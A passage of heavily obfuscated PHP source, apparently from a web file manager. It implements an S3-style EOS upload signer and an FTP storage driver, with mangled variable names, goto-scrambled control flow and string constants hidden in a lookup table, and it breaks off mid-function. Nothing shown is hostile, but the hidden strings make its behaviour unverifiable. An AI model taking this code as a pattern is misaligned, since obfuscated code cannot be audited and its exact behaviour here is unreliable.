B¯ÃÙ’²¶ˆ: define($_SERVER[…ë˜õ][235], 2); define($_SERVER[…ë˜õ][236], 3); define($_SERVER[…ë˜õ][237], 1); goto a‘±»Ñ÷º‚; eíŸÖ‰Ö©: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Cá»ì¯£Ê) { parent::__construct($Cá»ì¯£Ê); $this->signatureVersion($_SERVER[…ë˜õ][210]); } public function uploadFormData($F‘Éï‡ƒ¬Ñ, $f¶·õŒ‘« = 3600) { goto EèÓ°í¶‹; bøŠ†Ë¬‚ù: $EÅ‹ñÚ·‘ = $f‡Ìâİ±òÉ[1230]; $Cô¥õ¯¢¢­ = $f¶·õŒ‘« . $f‡Ìâİ±òÉ[33]; $c…ğµ™È¶ì = $f‡Ìâİ±òÉ[1192]; goto dö˜ƒÖî´; EÌæÏÄ–²–: $E«Ö†—¶›² = array($f‡Ìâİ±òÉ[209] => $f‡Ìâİ±òÉ[33], $f‡Ìâİ±òÉ[1240] => $f‡Ìâİ±òÉ[33], $f‡Ìâİ±òÉ[1196] => $a°†°ºô‰¤, $f‡Ìâİ±òÉ[1200] => $c…ğµ™È¶ì, $f‡Ìâİ±òÉ[1204] => $C­„ÎÅ¨Ï, $f‡Ìâİ±òÉ[1241] => $a¼Òì£±±Ş, $f‡Ìâİ±òÉ[1242] => $b½Ã‹Œã”, $f‡Ìâİ±òÉ[1243] => $CùõÔÅ„™±, $f‡Ìâİ±òÉ[1244] => $Cô¥õ¯¢¢­, $f‡Ìâİ±òÉ[1245] => $CÙ‚Ş½‘áù, $f‡Ìâİ±òÉ[174] => $this->getHost()); return $E«Ö†—¶›²; goto bù–ÙäÒö; EèÓ°í¶‹: $f‡Ìâİ±òÉ =& $_SERVER[…ë˜õ]; $a°†°ºô‰¤ = $f‡Ìâİ±òÉ[190]; $b½Ã‹Œã” = $f‡Ìâİ±òÉ[1228]; goto eŠªÒ»‰ò; bó¹£Ö¬¬’: $Dùèœ•©î‘ = hash_hmac($f‡Ìâİ±òÉ[1238], $FÄÑÄ±©ª, $cêêƒ·°£, !0); $f«ê§Ú…–î = hash_hmac($f‡Ìâİ±òÉ[1238], $EÅ‹ñÚ·‘, $Dùèœ•©î‘, !0); $CÙ‚Ş½‘áù = hash_hmac($f‡Ìâİ±òÉ[1238], $C­„ÎÅ¨Ï, $f«ê§Ú…–î); goto EÌæÏÄ–²–; dö˜ƒÖî´: $eÕ ¶ç¶å‰ = array($this->accessKey, $Aô‹˜™À‚‘, $this->region, $FÄÑÄ±©ª, $EÅ‹ñÚ·‘); $a¼Òì£±±Ş = implode($f‡Ìâİ±òÉ[8], $eÕ ¶ç¶å‰); $D¸…İÒ‰­¤ = array($f‡Ìâİ±òÉ[1194] => gmdate($f‡Ìâİ±òÉ[1193], strtotime($f‡Ìâİ±òÉ[1231])), $f‡Ìâİ±òÉ[1195] => array(array($f‡Ìâİ±òÉ[1197] => $this->bucket), array($f‡Ìâİ±òÉ[1196] => $a°†°ºô‰¤), array($f‡Ìâİ±òÉ[1198], $f‡Ìâİ±òÉ[1199], $f‡Ìâİ±òÉ[33]), array($f‡Ìâİ±òÉ[1198], $f‡Ìâİ±òÉ[1232], $f‡Ìâİ±òÉ[33]), array($f‡Ìâİ±òÉ[1198], $f‡Ìâİ±òÉ[1233], $f‡Ìâİ±òÉ[33]), array($f‡Ìâİ±òÉ[1200] => $c…ğµ™È¶ì), array($f‡Ìâİ±òÉ[1234] => $a¼Òì£±±Ş), array($f‡Ìâİ±òÉ[1235] => $b½Ã‹Œã”), array($f‡Ìâİ±òÉ[1236] => $CùõÔÅ„™±), array($f‡Ìâİ±òÉ[1237] => $Cô¥õ¯¢¢­))); goto dİ—½ëÄ¾¡; dİ—½ëÄ¾¡: $C­„ÎÅ¨Ï = base64_encode(json_encode($D¸…İÒ‰­¤)); $BŞ”†ĞâÇì = hash_hmac($f‡Ìâİ±òÉ[1238], $Aô‹˜™À‚‘, $f‡Ìâİ±òÉ[1239] . $this->secret, !0); $cêêƒ·°£ = hash_hmac($f‡Ìâİ±òÉ[1238], $this->region, $BŞ”†ĞâÇì, !0); goto bó¹£Ö¬¬’; eŠªÒ»‰ò: $FÄÑÄ±©ª = $f‡Ìâİ±òÉ[59]; $CùõÔÅ„™± = gmdate($f‡Ìâİ±òÉ[1229]); $Aô‹˜™À‚‘ = gmdate($f‡Ìâİ±òÉ[732]); goto bøŠ†Ë¬‚ù; bù–ÙäÒö: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($CÏ©Ü•Ë) { parent::__construct(); if (count($CÏ©Ü•Ë) > 0) { $this->_init($CÏ©Ü•Ë); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($e«†ÖßŸËë) { $C†Ùï–‡ =& $_SERVER[…ë˜õ]; global $config; $this->appCharset = $config[$C†Ùï–‡[1246]]; $this->systemCharset = $config[$C†Ùï–‡[1247]]; if (isset($e«†ÖßŸËë[$C†Ùï–‡[1248]]) && $e«†ÖßŸËë[$C†Ùï–‡[1248]]) { $this->systemCharset = $e«†ÖßŸËë[$C†Ùï–‡[1248]]; } } public function iconvApp($F…¼§Ëñï¾) { return $this->iconvTo($F…¼§Ëñï¾, $this->systemCharset, $this->appCharset); } public function iconvSystem($b¾à–á†ŒÏ) { return $this->iconvTo($b¾à–á†ŒÏ, $this->appCharset, $this->systemCharset); } public function getPathOuter($DÛ½ŠÂö¿Í) { goto b«ğ”®ëàØ; bšøˆÃˆä: if (substr($A¦Ä‚ß •², 0, 2) == $eÉåÊÉìÒ[1249]) { $A¦Ä‚ß •² = BASIC_PATH . substr($A¦Ä‚ß •², 2); } if (substr($DÛ½ŠÂö¿Í, 0, 2) == $eÉåÊÉìÒ[1249]) { $DÛ½ŠÂö¿Í = BASIC_PATH . substr($DÛ½ŠÂö¿Í, 2); } $A¦Ä‚ß •² = KodIO::clear($A¦Ä‚ß •²); goto bÊäƒØ™‚; b«ğ”®ëàØ: $eÉåÊÉìÒ =& $_SERVER[…ë˜õ]; $A¦Ä‚ß •² = $this->iconvApp($this->pathBase); $DÛ½ŠÂö¿Í = $this->iconvApp($DÛ½ŠÂö¿Í); goto bšøˆÃˆä; e¹Òã–œ: return $this->pathDriver . $eÉåÊÉìÒ[8] . ltrim($DÛ½ŠÂö¿Í, $eÉåÊÉìÒ[8]); goto A¡ÉÄÔàõ; bÊäƒØ™‚: $DÛ½ŠÂö¿Í = KodIO::clear($DÛ½ŠÂö¿Í); $DÛ½ŠÂö¿Í = substr($DÛ½ŠÂö¿Í, strlen($A¦Ä‚ß •²)); if (empty($this->pathDriver)) { return $DÛ½ŠÂö¿Í; } goto e¹Òã–œ; A¡ÉÄÔàõ: } private function _init($DƒÕƒâ‹Ãâ = array()) { $Fğ†‡îñøÚ =& $_SERVER[…ë˜õ]; if (!function_exists($Fğ†‡îñøÚ[1250])) { throw new Exception(LNG($Fğ†‡îñøÚ[1251])); } $this->config = $DƒÕƒâ‹Ãâ; $this->charsetReset($DƒÕƒâ‹Ãâ); foreach ($DƒÕƒâ‹Ãâ as $eòŸéìÆÅÏ => $c¬ÅŒøòî) { if (isset($this->{$eòŸéìÆÅÏ})) { $this->{$eòŸéìÆÅÏ} = $c¬ÅŒøòî; } } return $this->_login($DƒÕƒâ‹Ãâ); } private function _login($dªÇÙ´Ù ª) { goto c–øÏ—¡Íğ; c©â¾—Æµ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Cˆ±§©Éí = $this->pasv == $FÒÀù ôÌï[86] ? !0 : !1; @ftp_pasv($this->connect, $Cˆ±§©Éí); goto aÅ—´¡¡¦Ë; aÅ—´¡¡¦Ë: $b¤â‹÷«ğ—[$Få¼Ì «©š] = array($FÒÀù ôÌï[1255] => $this->connect, $FÒÀù ôÌï[174] => $this->host, $FÒÀù ôÌï[173] => $this->scheme, $FÒÀù ôÌï[175] => $this->port); return $dÛïÔ¶×º; goto d‰‘äâ¨Ó˜; c–øÏ—¡Íğ: $FÒÀù ôÌï =& $_SERVER[…ë˜õ]; static $b¤â‹÷«ğ— = array(); $Få¼Ì «©š = md5(json_encode($dªÇÙ´Ù ª)); goto eÂ”øî‡Œ; eÂ”øî‡Œ: if (isset($b¤â‹÷«ğ—[$Få¼Ì «©š])) { foreach ($b¤â‹÷«ğ—[$Få¼Ì «©š] as $dËàƒ½ç® => $e—ÚŠİÄ¶İ) { $this->{$dËàƒ½ç®} = $e—ÚŠİÄ¶İ; } return !0; } $EÑ÷ğ—ô = parse_url(trim($this->server, $FÒÀù ôÌï[8])); $this->host = $EÑ÷ğ—ô[$FÒÀù ôÌï[174]]; goto eÏî¦ñ‹×İ; eÏî¦ñ‹×İ: $CÇøÊã¨È¼ = isset($EÑ÷ğ—ô[$FÒÀù ôÌï[173]]) && $EÑ÷ğ—ô[$FÒÀù ôÌï[173]] == $FÒÀù ôÌï[1252] ? !0 : !1; $this->scheme = $CÇøÊã¨È¼ ? $FÒÀù ôÌï[1253] : $FÒÀù ôÌï[1254]; $this->port = isset($EÑ÷ğ—ô[$FÒÀù ôÌï[175]]) ? $EÑ÷ğ—ô[$FÒÀù ôÌï[175]] : 21; goto E²Å‚Œ—Œ; E²Å‚Œ—Œ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $dÛïÔ¶×º = @ftp_login($this->connect, $this->username, $this->userpass); goto c©â¾—Æµ; d‰‘äâ¨Ó˜: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Dàî‚Åùˆ, $d¤£áÉÕÕÒ = '', $a‰¾Á·Á£Ã = REPEAT_RENAME) { if ($this->setContent($Dàî‚Åùˆ, $d¤£áÉÕÕÒ)) { return $this->getPathOuter($Dàî‚Åùˆ); } return !1; } public function mkdir($AÌìã¢Î–•, $D¦´Š¨•¨ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $AÌìã¢Î–• = $this->iconvSystem($AÌìã¢Î–•); if ($this->_isFolder($AÌìã¢Î–•) || @ftp_mkdir($this->connect, $AÌìã¢Î–•)) { return $this->getPathOuter($AÌìã¢Î–•); } if (!$this->mkdir($this->pathFather($AÌìã¢Î–•))) { return !1; } if ($AÌìã¢Î–• = @ftp_mkdir($this->connect, $AÌìã¢Î–•)) { return $this->getPathOuter($AÌìã¢Î–•); } return !1; } public function copyFile($Aš»¥ë¸ˆ­, $c…ÌªêõºÅ) { goto F°¼­ŒÇ…Ö; C¨¢„•É×: $D™­„¾Û« = $this->iconvApp($fÉ¶Ï´Ğ½†); $this->download($Aš»¥ë¸ˆ­, $D™­„¾Û«); $BïÆê×£œä = $this->upload($c…ÌªêõºÅ, $D™­„¾Û«); goto AÍ†â—…åé; AÍ†â—…åé: $this->tempFileRemve($fÉ¶Ï´Ğ½†); return $BïÆê×£œä; goto FãÜ°£ô¼°; F°¼­ŒÇ…Ö: if (!$this->_isconn()) { return !1; } $C—¤Ã¾Š¦¿ = $this->pathThis($this->iconvSystem($Aš»¥ë¸ˆ­)); $fÉ¶Ï´Ğ½† = $this->tempFile($C—¤Ã¾Š¦¿); goto C¨¢„•É×; FãÜ°£ô¼°: } public function moveFile($dãÙÄÎê¸, $FùšİÓÍß¨) { if (!$this->_isconn()) { return !1; } $dãÙÄÎê¸ = $this->iconvSystem($dãÙÄÎê¸); $FùšİÓÍß¨ = $this->iconvSystem($FùšİÓÍß¨); $EõÙÊìÂÕ = @ftp_rename($this->connect, $dãÙÄÎê¸, $FùšİÓÍß¨); return $EõÙÊìÂÕ ? $this->getPathOuter($FùšİÓÍß¨) : !1; } public function delFile($FËè¨Å¬Çí) { if (!$this->_isconn()) { return !1; } $FËè¨Å¬Çí = $this->iconvSystem($FËè¨Å¬Çí); return @ftp_delete($this->connect, $FËè¨Å¬Çí); } public function delFolder($DÈ‡ååà›É) { goto Cõ™ñİ¡ñë; b¿¯ƒôôñµ: $this->fileList($DÈ‡ååà›É, $Dîï‰Ï , $F±Ê å“Û, !0); $this->listItemCache = !0; foreach ($F±Ê å“Û as $AËŸ‰äŸƒô) { $f††ÆÖâ± = $this->iconvSystem($AËŸ‰äŸƒô[$_SERVER[…ë˜õ][28]]); $e„„àâƒÓí = @ftp_delete($this->connect, $f††ÆÖâ±); if (!$e„„àâƒÓí) { return !1; } } goto Aºãñ¶ÇÍ; Aºãñ¶ÇÍ: foreach ($Dîï‰Ï  as $f††ÆÖâ±) { $f††ÆÖâ± = $this->iconvSystem($f††ÆÖâ±); $e„„àâƒÓí = @ftp_rmdir($this->connect, $f††ÆÖâ±); if (!$e„„àâƒÓí) { return !1; } } $DÈ‡ååà›É = $this->iconvSystem($DÈ‡ååà›É); return @ftp_rmdir($this->connect, $DÈ‡ååà›É); goto CËÙ•™¿‚ò; Cõ™ñİ¡ñë: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Dîï‰Ï  = $F±Ê å“Û = array(); goto b¿¯ƒôôñµ; CËÙ•™¿‚ò: } public function rename($Dñ·Ê—¾Ëè, $a˜À÷‹çÆØ) { goto f¢ºØë«„; B±ò„Ä† ÷: return $fˆ•Í–œÔ„ ? $this->getPathOuter($fË‹®–É) : !1; goto eÌ›ø½›é’; AíİÛˆ³: $fË‹®–É = rtrim($CÉë‘Ñ˜Ê, $C¶–»ŸÙĞ[8]) . $C¶–»ŸÙĞ[8] . $D•–Š••®î; $fˆ•Í–œÔ„ = @ftp_rename($this->connect, $Dñ·Ê—¾Ëè, $fË‹®–É); $fË‹®–É = $this->iconvApp($fË‹®–É); goto B±ò„Ä† ÷; fëğîëÉ: $D•–Š••®î = $this->iconvSystem($D•–Š••®î); $Dñ·Ê—¾Ëè = $this->iconvSystem($Dñ·Ê—¾Ëè); $CÉë‘Ñ˜Ê = $this->pathFather($Dñ·Ê—¾Ëè); goto AíİÛˆ³; f¢ºØë«„: $C¶–»ŸÙĞ =& $_SERVER[…ë˜õ]; if (!$this->_isconn()) { return !1; } $D•–Š••®î = $this->fileNameAuto($this->pathFather($Dñ·Ê—¾Ëè), $a˜À÷‹çÆØ); goto fëğîëÉ; eÌ›ø½›é’: } private function folderInfo($cÚ²Œ††æ, $cÁòÛ¡³‘Ä = false) { $Bš¨”×¨±ª =& $_SERVER[…ë˜õ]; $cÈÂÃ„ƒ¥° = array($Bš¨”×¨±ª[28] => $this->pathThis($cÚ²Œ††æ), $Bš¨”×¨±ª[75] => $this->getPathOuter($Bš¨”×¨±ª[8] . $cÚ²Œ††æ), $Bš¨”×¨±ª[29] => $Bš¨”×¨±ª[76]); if ($cÁòÛ¡³‘Ä) { return $cÈÂÃ„ƒ¥°; } $cÈÂÃ„ƒ¥°[$Bš¨”×¨±ª[192]] = $cÈÂÃ„ƒ¥°[$Bš¨”×¨±ª[83]] = 0; $cÈÂÃ„ƒ¥°[$Bš¨”×¨±ª[193]] = $cÈÂÃ„ƒ¥°[$Bš¨”×¨±ª[194]] = !0; return $cÈÂÃ„ƒ¥°; } private function fileInfo($FÑ‘ù±¤ï“, $e³²Ğˆ‚ïÅ = false, $eš¡Ø ğ™÷ = array()) { goto CÉä³ÃÛÛŒ; Aå‡‡—¿: return $a«ù¯Œ·¤; goto CÆãá–ï¢Ø; FÛ²êÚ¿ø: $a«ù¯Œ·¤[$cªêõç„è‡[83]] = @ftp_mdtm($this->connect, $b×º÷·›§Ğ); if (empty($eš¡Ø ğ™÷)) { $eš¡Ø ğ™÷ = $this->objectMeta($FÑ‘ù±¤ï“); if (!$eš¡Ø ğ™÷) { return $a«ù¯Œ·¤; } } $a«ù¯Œ·¤[$cªêõç„è‡[77]] = $eš¡Ø ğ™÷[$cªêõç„è‡[77]]; goto Aå‡‡—¿; CÉä³ÃÛÛŒ: $cªêõç„è‡ =& $_SERVER[…ë˜õ]; $a«ù¯Œ·¤ = array($cªêõç„è‡[28] => $this->pathThis($FÑ‘ù±¤ï“), $cªêõç„è‡[75] => $this->getPathOuter($cªêõç„è‡[8] . $FÑ‘ù±¤ï“), $cªêõç„è‡[29] => $cªêõç„è‡[191], $cªêõç„è‡[77] => isset($eš¡Ø ğ™÷[$cªêõç„è‡[77]]) ? $eš¡Ø ğ™÷[$cªêõç„è‡[77]] : 0, $cªêõç„è‡[167] => $this->ext($FÑ‘ù±¤ï“)); if ($e³²Ğˆ‚ïÅ) { return $a«ù¯Œ·¤; } goto D³ÍÇ¦â; D³ÍÇ¦â: $a«ù¯Œ·¤[$cªêõç„è‡[192]] = $a«ù¯Œ·¤[$cªêõç„è‡[83]] = 0; $a«ù¯Œ·¤[$cªêõç„è‡[193]] = $a«ù¯Œ·¤[$cªêõç„è‡[194]] = !0; $b×º÷·›§Ğ = $this->iconvSystem($FÑ‘ù±¤ï“); goto FÛ²êÚ¿ø; CÆãá–ï¢Ø: } public function size($aœâ¥âäÒ…) { $Fßé­±µ™× = $this->objectMeta($aœâ¥âäÒ…); return $Fßé­±µ™× ? $Fßé­±µ™×[$_SERVER[…ë˜õ][77]] : 0; } public function info($fóÌßŒ­¨) { if ($this->isFile($fóÌßŒ­¨)) { return $this->fileInfo($fóÌßŒ­¨, 0); } else { if ($this->isFolder($fóÌßŒ­¨)) { return $this->folderInfo($fóÌßŒ­¨); } } return !1; } private function fileList($Fï±Ñ¼«, &$bµ…‰½“ëÍ, &$bØ‰†ÛÒÂù, $eêÊƒİ‘ê = false) { goto c·Õˆëâä; dí¿ªôÜøä: @ftp_chdir($this->connect, $bğ¹‰ÖˆõÁ[8]); $Fï±Ñ¼« = rtrim($Fï±Ñ¼«, $bğ¹‰ÖˆõÁ[8]) . $bğ¹‰ÖˆõÁ[8]; check_abort(); goto eÌœëßˆ¼Š; eÌœëßˆ¼Š: $b‹¨£â¾È = $this->listItemCache === !1 ? !1 : !0; $b‡‡ÅŒŸà = @ftp_rawlist($this->connect, $Fï±Ñ¼«); if (!$b‡‡ÅŒŸà) { $b‡‡ÅŒŸà = array(); } goto DõŞÍÒ‹ƒ—; c·Õˆëâä: $bğ¹‰ÖˆõÁ =& $_SERVER[…ë˜õ]; $Fï±Ñ¼« = $this->iconvSystem($Fï±Ñ¼«); if (!$this->isFolder($Fï±Ñ¼«)) { return !1; } goto dí¿ªôÜøä; DõŞÍÒ‹ƒ—: $fè–¤’Ñî¶ = array($bğ¹‰ÖˆõÁ[94] => 1, $bğ¹‰ÖˆõÁ[1256] => 1); foreach ($b‡‡ÅŒŸà as $CØƒØ¸ã ·) { goto eÄºŠŞÑµñ; AŠÒÜ‰·¸: if ($cóºÓ“å´) { $bµ…‰½“ëÍ[] = $DÙîÔ§×ñŞ; if ($eêÊƒİ‘ê) { $this->fileList($DÙîÔ§×ñŞ, $bµ…‰½“ëÍ, $bØ‰†ÛÒÂù, $eêÊƒİ‘ê); } continue; } $bØ‰†ÛÒÂù[] = $a†óóß”š; goto AÓ·ö«; A¢÷é…†Ÿº: if (!$DÙîÔ§×ñŞ || isset($fè–¤’Ñî¶[$DÙîÔ§×ñŞ])) { continue; } $DÙîÔ§×ñŞ = $this->iconvApp($Fï±Ñ¼« . ltrim($DÙîÔ§×ñŞ, $bğ¹‰ÖˆõÁ[8])); $a†óóß”š = array($bğ¹‰ÖˆõÁ[28] => $DÙîÔ§×ñŞ, $bğ¹‰ÖˆõÁ[29] => $bğ¹‰ÖˆõÁ[191], $bğ¹‰ÖˆõÁ[77] => $A­›Ì¶¶—[4]); goto F®ç­ÄĞ—ê; eÄºŠŞÑµñ: $A­›Ì¶¶— = $this->_listItem($CØƒØ¸ã ·); if ($A­›Ì¶¶—[0] == $bğ¹‰ÖˆõÁ[737]) { continue; } $DÙîÔ§×ñŞ = $A­›Ì¶¶—[8]; goto A¢÷é…†Ÿº; F®ç­ÄĞ—ê: if (substr($CØƒØ¸ã ·, 0, 1) == $bğ¹‰ÖˆõÁ[1257]) { $a†óóß”š[$bğ¹‰ÖˆõÁ[29]] = $bğ¹‰ÖˆõÁ[76]; $a†óóß”š[$bğ¹‰ÖˆõÁ[77]] = 0; } $cóºÓ“å´ = $a†óóß”š[$bğ¹‰ÖˆõÁ[29]] == $bğ¹‰ÖˆõÁ[76] ? !0 : !1; if ($b‹¨£â¾È) { $this->cacheMethod($bğ¹‰ÖˆõÁ[197], $DÙîÔ§×ñŞ, $cóºÓ“å´); $this->cacheMethod($bğ¹‰ÖˆõÁ[198], $DÙîÔ§×ñŞ, $a†óóß”š); } goto AŠÒÜ‰·¸; AÓ·ö«: } if ($b‹¨£â¾È) { $this->cacheMethod($bğ¹‰ÖˆõÁ[197], $Fï±Ñ¼«, !0); } goto C³İïØ¤½´; C³İïØ¤½´: } private function _listItem($eïùŠØ¤) { if (empty($eïùŠØ¤)) { return array(); } $eí»½á’Œ† = preg_split($_SERVER[…ë˜õ][1258], $eïùŠØ¤); if (count($eí»½á’Œ†) <= 9) { return $eí»½á’Œ†; } $eí»½á’Œ†[8] = trim(substr($eïùŠØ¤, strpos($eïùŠØ¤, $eí»½á’Œ†[7]) + strlen($eí»½á’Œ†[7]))); return array_splice($eí»½á’Œ†, 0, 9); } public function listPath($E¦•”‡‘ó°, $bù³¢ëŒ‡ì = false) { goto A±õàÏÅˆĞ; B¾¡¥‡¼·‰: return array($d•ê…»ãá[74] => $BÔÌÀœˆ©ó, $d•ê…»ãá[73] => $Eìä£¹£İœ); goto Fôø˜‡‰ŒÀ; A±õàÏÅˆĞ: $d•ê…»ãá =& $_SERVER[…ë˜õ]; if (!$this->_isconn()) { return !1; } $BÔÌÀœˆ©ó = $Eìä£¹£İœ = array(); goto BµÑÓ•ÅÉ‚; BµÑÓ•ÅÉ‚: $this->fileList($E¦•”‡‘ó°, $BÔÌÀœˆ©ó, $Eìä£¹£İœ); foreach ($BÔÌÀœˆ©ó as $Aìß››‡’Ü => $D„öÅé÷º“) { $BÔÌÀœˆ©ó[$Aìß››‡’Ü] = $this->folderInfo($D„öÅé÷º“, $bù³¢ëŒ‡ì); } foreach ($Eìä£¹£İœ as $Aìß››‡’Ü => $D„öÅé÷º“) { $Eìä£¹£İœ[$Aìß››‡’Ü] = $this->fileInfo($D„öÅé÷º“[$d•ê…»ãá[28]], $bù³¢ëŒ‡ì, $D„öÅé÷º“); } goto B¾¡¥‡¼·‰; Fôø˜‡‰ŒÀ: } public function has($aƒ„æ½í÷Ó, $dğé¸¯ğÑš = false, $d¼‹È„•Ó˜ = true) { goto E–Ê†Ë¸Äª; f“‰øÆõ¶½: $this->fileList($aƒ„æ½í÷Ó, $FäŠø•Ë·İ, $báŠ†§Ò†–, $DÅÄ—ó¾á”); if ($dğé¸¯ğÑš) { return array($e»‰¡´É•¿[201] => count($báŠ†§Ò†–), $e»‰¡´É•¿[202] => count($FäŠø•Ë·İ)); } if ($d¼‹È„•Ó˜) { if (count($báŠ†§Ò†–)) { return !0; } } else { if (count($FäŠø•Ë·İ)) { return !0; } } goto CÂä§Ö¾¤¹; E–Ê†Ë¸Äª: $e»‰¡´É•¿ =& $_SERVER[…ë˜õ]; $FäŠø•Ë·İ = $báŠ†§Ò†– = array(); $DÅÄ—ó¾á” = $dğé¸¯ğÑš ? !0 : !1; goto f“‰øÆõ¶½; CÂä§Ö¾¤¹: return !1; goto E¡¹œ¿öº; E¡¹œ¿öº: } public function listAll($AÈ…ÄÌ„„) { goto B†óÒƒ‡¢ø; aôÆĞÁ¢Üæ: foreach ($F‰æØå»ğª as $DŠ“„ëª’) { if (is_string($DŠ“„ëª’)) { $FÖèò¶Ê¤ğ[$DŠ“„ëª’] = 0; } } return $this->listAllFiles($AÈ…ÄÌ„„, array_keys($FÖèò¶Ê¤ğ), $FÖèò¶Ê¤ğ); goto aƒõ³à¿î; B†óÒƒ‡¢ø: $EÍ…åÍèé =& $_SERVER[…ë˜õ]; if (!$this->_isconn()) { return !1; } $F‰æØå»ğª = $EÜ‰ñáå…± = array(); goto b•’¯ÔñÓæ; b•’¯ÔñÓæ: $this->fileList($AÈ…ÄÌ„„, $F‰æØå»ğª, $EÜ‰ñáå…±, !0); $FÖèò¶Ê¤ğ = array(); foreach ($EÜ‰ñáå…± as $DŠ“„ëª’) { $FÖèò¶Ê¤ğ[$DŠ“„ëª’[$EÍ…åÍèé[28]]] = $DŠ“„ëª’[$EÍ…åÍèé[77]]; } goto aôÆĞÁ¢Üæ; aƒõ³à¿î: } public function getContent($Dòõ¥¸—ÈŞ) { if (!$this->_isconn()) { return !1; } $Dòõ¥¸—ÈŞ = $this->iconvSystem($Dòõ¥¸—ÈŞ); return $this->fileSubstr($Dòõ¥¸—ÈŞ); } public function setContent($d–Á¶ˆ„Éó, $D–í§ŒÃ„í = '') { goto DÔ¶‚ºõ“; E®‰ğ„É±ˆ: return $a§ğŸÌ…Èˆ; goto E¯ºÜæ‹¡Î; DÔ¶‚ºõ“: if (!$this->_isconn()) { return !1; } $DŠÛ«É±ƒ = $this->pathThis($this->iconvSystem($d–Á¶ˆ„Éó)); $BğõˆÌŒ¥‘ = $this->tempFile($DŠÛ«É±ƒ); goto B¬ˆôİÕÄä; B¬ˆôİÕÄä: file_put_contents($BğõˆÌŒ¥‘, $D–í§ŒÃ„í); $a§ğŸÌ…Èˆ = $this->upload($d–Á¶ˆ„Éó, $this->iconvApp($BğõˆÌŒ¥‘)); $this->tempFileRemve($BğõˆÌŒ¥‘); goto E®‰ğ„É±ˆ; E¯ºÜæ‹¡Î: } public function fileSubstr($DëÄÀ«Ì, $eëÛ¨ÆÌ²· = 0, $bÌ¬ÂµØˆÛ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($DëÄÀ«Ì, $eëÛ¨ÆÌ²·, $bÌ¬ÂµØˆÛ); } private function ftpRequest($f†Ÿù‚·…, $a£ØÅ¯¡àÎ = 0, $a…õ¿…ñì = false) { goto D·ÆªˆËİ; cˆ„Â¶ïÎõ: return $Dê˜¾…õãò; goto E­óå¡ÒÓµ; e²¸¡¸¸œŠ: curl_setopt($D¹ä—†±¶, CURLOPT_RETURNTRANSFER, 1); $Dê˜¾…õãò = curl_exec($D¹ä—†±¶); curl_close($D¹ä—†±¶); goto cˆ„Â¶ïÎõ; D·ÆªˆËİ: $f†Ÿù‚·… = $this->iconvSystem($f†Ÿù‚·…); $e®àÍ°¿Š› = $this->scheme . $this->host . $_SERVER[…ë˜õ][4] . $this->port; $D¹ä—†±¶ = curl_init(); goto c„èÚğ‚§İ; c„èÚğ‚§İ: curl_setopt($D¹ä—†±¶, CURLOPT_URL, $e®àÍ°¿Š› . $this->pathEncode($f†Ÿù‚·…)); curl_setopt($D¹ä—†±¶, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($a…õ¿…ñì) { $F’¹Ø³ÊİÆ = $a£ØÅ¯¡àÎ + $a…õ¿…ñì - 1; curl_setopt($D¹ä—†±¶, CURLOPT_RANGE, "{$a£ØÅ¯¡àÎ}\x2d{$F’¹Ø³ÊİÆ}"); } goto e²¸¡¸¸œŠ; E­óå¡ÒÓµ: } public function upload($C”ª³åÃ­, $E„É«½ßÓÆ, $Fİ´Ã±£Ï› = false, $CƒÅÛĞ¼‘ = REPEAT_REPLACE) { goto Bí…©¥¹Ô¤; Bí…©¥¹Ô¤: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($C”ª³åÃ­))) { return !1; } $C”ª³åÃ­ = $this->iconvSystem($C”ª³åÃ­); goto EÑƒë°İ‚; DãùÛÖáÙ: if ($Eš×ÌÍ¥ª¬ != FTP_FINISHED) { return !1; } return $this->getPathOuter($C”ª³åÃ­); goto aŞÚ°–ŞØ‡; EÑƒë°İ‚: $E„É«½ßÓÆ = $this->iconvSystem($E„É«½ßÓÆ); $Eš×ÌÍ¥ª¬ = ftp_nb_put($this->connect, $C”ª³åÃ­, $E„É«½ßÓÆ, FTP_BINARY); while ($Eš×ÌÍ¥ª¬ == FTP_MOREDATA) { $Eš×ÌÍ¥ª¬ = ftp_nb_continue($this->connect); } goto DãùÛÖáÙ; aŞÚ°–ŞØ‡: } public function download($C«‚‰§¼Ï, $c¢éÊº†ŠÓ = '') { goto AÅ¡­öŸÄŸ; AÅ¡­öŸÄŸ: if (!$this->_isconn()) { return !1; } $BËˆ“ñÑ–‚ = $this->pathFather($c¢éÊº†ŠÓ); if (!IO::mkdir($BËˆ“ñÑ–‚)) { return !1; } goto FÇÃ¾°ß×¿; FÇÃ¾°ß×¿: $C«‚‰§¼Ï = $this->iconvSystem($C«‚‰§¼Ï); $c¢éÊº†ŠÓ = $this->iconvSystem($c¢éÊº†ŠÓ); $fà‰³¡ò˜— = ftp_nb_get($this->connect, $c¢éÊº†ŠÓ, $C«‚‰§¼Ï, FTP_BINARY); goto D…ù¼ñŞß«; D…ù¼ñŞß«: while ($fà‰³¡ò˜— == FTP_MOREDATA) { $fà‰³¡ò˜— = ftp_nb_continue($this->connect); } if ($fà‰³¡ò˜— != FTP_FINISHED) { return !1; } return $this->iconvApp($c¢éÊº†ŠÓ); goto D‰ã©‘Ç± ; D‰ã©‘Ç± : } public function exist($E¯¢šÊ×ë) { return $this->isFile($E¯¢šÊ×ë) || $this->isFolder($E¯¢šÊ×ë); } public function isFile($EÊâ—Ô¦ª±) { return !$this->isFolder($EÊâ—Ô¦ª±) && $this->objectMeta($EÊâ—Ô¦ª±); } public function isFolder($FÉÂº”æ–İ) { return $this->cacheMethod($_SERVER[…ë˜õ][197], $FÉÂº”æ–İ); } protected function objectMeta($d«ƒ×Ç¸èÈ) { return $this->cacheMethod($_SERVER[…ë˜õ][198], $d«ƒ×Ç¸èÈ); } protected function _objectMeta($dÀ½Ã¿“Ÿ‡) { goto 